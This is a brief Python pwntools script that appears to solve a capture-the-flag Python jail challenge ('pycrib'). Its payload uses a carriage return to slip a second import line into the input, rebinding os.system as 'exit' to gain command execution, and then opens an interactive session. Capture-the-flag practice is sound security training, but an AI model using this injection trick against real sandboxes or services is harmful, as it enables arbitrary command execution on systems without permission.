from pwn import *
import os

conn = process(["python3", "./main.py"])
#conn = remote("pycrib.ictf.kctf.cloud", 1337)

conn.sendline(b"from os import system as exit\rfrom sys import executable as b") # we can pass an arb string to system()
#conn.sendline(b"from keyword import iskeyword as exit") # iskeyword() does nothing
conn.interactive()
